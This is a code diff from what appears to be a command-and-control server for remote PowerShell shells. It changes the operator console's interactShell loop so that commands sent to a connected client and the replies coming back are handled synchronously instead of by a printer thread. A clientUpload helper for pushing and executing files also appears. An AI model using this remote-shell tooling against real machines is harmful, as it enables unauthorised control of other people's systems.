@@ -88,37 +88,27 @@ def interactShell(clientnumber):
     for server in serverlist:
         if clientnumber in server.handlers.keys():
             print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
-            e = threading.Event()
-            printer = threading.Thread(target=listenPrinter, args=(clientnumber, server, e))
-            printer.setDaemon(True)
-            printer.start()
             while True:
+                if server.handlers[clientnumber].in_buffer:
+                    print server.handlers[clientnumber].in_buffer.pop()
                 command = raw_input("PS >")
                 if command.lower() == "back":
-                    e.set()
                     break
                 elif command.lower() == "exit":
                     server.handlers[clientnumber].handle_close()
                     del clientMenuOptions[str(clientnumber)]
-                    e.set()
                     time.sleep(2)
                     break
                 elif command == "":
                     pass
                 else:
                     server.handlers[clientnumber].out_buffer.append(command)
+                    while not server.handlers[clientnumber].in_buffer:
+                        time.sleep(0.01)
+                    print server.handlers[clientnumber].in_buffer.pop()
+
+
     return "clear"
-
-
-def listenPrinter(clientnumber, server, e):
-    from menu import clientMenuOptions
-    while not e.isSet():
-        if server.handlers[clientnumber].in_buffer:
-            sys.stdout.write("\r" + " "*(len(readline.get_line_buffer())+2) + "\r")
-            print server.handlers[clientnumber].in_buffer.pop()
-            sys.stdout.write("PS >" + readline.get_line_buffer())
-            sys.stdout.flush()
-    sys.exit()
 
 def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
     if isExe:
